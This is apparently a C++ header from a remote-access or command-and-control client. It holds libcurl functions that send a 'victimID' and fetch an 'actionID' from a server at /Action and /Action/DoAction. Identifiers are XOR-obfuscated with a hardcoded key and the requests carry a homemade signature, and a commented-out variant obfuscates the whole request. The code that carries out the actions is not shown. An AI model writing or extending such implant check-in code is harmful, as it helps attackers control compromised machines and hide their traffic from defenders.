#pragma once
#include <Windows.h>
#include <iostream>
#include <curl/curl.h>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <string>
#include "resource.h"

using namespace std;

class httpRequest {
public:

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
        size_t total_size = size * nmemb;
        output->append(static_cast<char*>(contents), total_size);
        return total_size;
    }

    static string createTimeStamp() {
        auto now = std::chrono::system_clock::now();
        auto now_time = std::chrono::system_clock::to_time_t(now);
        std::stringstream ss;
        ss << std::put_time(std::localtime(&now_time), "%Y-%m-%dT%H:%M:%S");
        return ss.str();
    }

    static unsigned int S12hash(const std::string& str) {
        unsigned int sum = 0;
        for (char ch : str) {
            sum += static_cast<unsigned int>(ch);
        }
        sum = sum * 83 + 12;
        return sum;
    }

    static unsigned long long createS12Hash(const std::string& str) {
        unsigned int h1 = S12hash(str);
        unsigned int h2 = S12hash(std::string(str.rbegin(), str.rend()));
        unsigned int h3 = h2 / 12;

        std::string hashValue = std::to_string(h1) + std::to_string(h2) + std::to_string(h3);

        unsigned long long finalHashValue = std::stoull(hashValue) * (83 + 12);
        return finalHashValue;
    }


    static std::string createSignature(const std::string& url) {
        std::string method = "POST";
        std::string timeStamp = createTimeStamp();
        std::string signature = method + url + timeStamp;

        unsigned long long hashValue = createS12Hash(signature);
        std::string hashValueStr = std::to_string(hashValue);
		std::string finalHashValue = std::to_string(hashValue);
		return finalHashValue;
    }
	
    string httpNewAction(string id) {
        string XappTimestamp = createTimeStamp();
        string XAppSignature = createSignature("/Action");
        
        // XAppSignature
        CURL* curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        id = XOR(id, "S12Secret");

        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action");
            curl_easy_setopt(curl, CURLOPT_POST, 1L);

            struct curl_slist* headers = NULL;
            headers = curl_slist_append(headers, "Content-Type: application/json");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

            headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
            headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

            const char* id_cstr = id.c_str();
            char post_data[256]; 
            snprintf(post_data, sizeof(post_data), "{\"id\": \"%s\"}", id_cstr);

            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
            string response_data;
            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
            res = curl_easy_perform(curl);
            curl_global_cleanup();
            curl_easy_cleanup(curl);
            return response_data;
        }  
     }

        string httpGetParamsAction(string victimID, string actionID) {
            httpRequest http = httpRequest();
            string XappTimestamp = http.createTimeStamp();
            string XAppSignature = http.createSignature("/Action/DoAction");

            // XAppSignature
            CURL* curl;
            CURLcode res;
            curl_global_init(CURL_GLOBAL_DEFAULT);
            curl = curl_easy_init();
            victimID = XOR(victimID, "S12Secret");
            actionID = XOR(actionID, "S12Secret");

            if (curl) {
                curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/DoAction");
                curl_easy_setopt(curl, CURLOPT_POST, 1L);

                struct curl_slist* headers = NULL;
                headers = curl_slist_append(headers, "Content-Type: application/json");
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

                headers = curl_slist_append(headers, ("X-App-Timestamp: " + XappTimestamp).c_str());
                headers = curl_slist_append(headers, ("X-App-Signature: " + XAppSignature).c_str());
                curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

                const char* id_cstr = victimID.c_str();
                const char* action_cstr = actionID.c_str();

                char post_data[256];
                snprintf(post_data, sizeof(post_data), "{\"id\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);

                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
                string response_data;
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
                res = curl_easy_perform(curl);
                curl_global_cleanup();
                curl_easy_cleanup(curl);
                return response_data;
            }
        }

    //string httpGetParamsAction(string victimID, string actionID) {
    //    httpRequest http = httpRequest();
    //    string XappTimestamp = http.createTimeStamp();
    //    string XAppSignature = http.createSignature("/Action/DoAction");

    //    // XAppSignature
    //    CURL* curl;
    //    CURLcode res;
    //    curl_global_init(CURL_GLOBAL_DEFAULT);
    //    curl = curl_easy_init();

    //    // Encrypting parameters with XOR
    //    victimID = XOR(victimID, "S12Secret");
    //    actionID = XOR(actionID, "S12Secret");

    //    if (curl) {
    //        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5068/Action/DoAction");
    //        curl_easy_setopt(curl, CURLOPT_POST, 1L);

    //        struct curl_slist* headers = NULL;
    //        headers = curl_slist_append(headers, "Content-Type: application/json");
    //        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    //        curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);

    //        // Encrypting headers with XOR
    //        headers = curl_slist_append(headers, ("X-App-Timestamp: " + XOR(XappTimestamp, "S12Secret")).c_str());
    //        headers = curl_slist_append(headers, ("X-App-Signature: " + XOR(XAppSignature, "S12Secret")).c_str());
    //        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    //        const char* id_cstr = victimID.c_str();
    //        const char* action_cstr = actionID.c_str();

    //        char post_data[256];
    //        snprintf(post_data, sizeof(post_data), "{\"victimID\":\"%s\",\"actionID\":\"%s\"}", id_cstr, action_cstr);

    //        // Encrypting post data with XOR
    //        string encrypted_post_data = XOR(post_data, "S12Secret");
    //        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, encrypted_post_data.c_str());
    //        string response_data;
    //        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, http.WriteCallback);
    //        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_data);
    //        res = curl_easy_perform(curl);
    //        curl_global_cleanup();
    //        curl_easy_cleanup(curl);
    //        return response_data;
    //    }
    //}
	
private:
    static string XOR(string data, string key) {
		string output = data;
		for (int i = 0; i < data.size(); i++) {
			output[i] = data[i] ^ key[i % key.size()];
		}
		return output;
	}
};
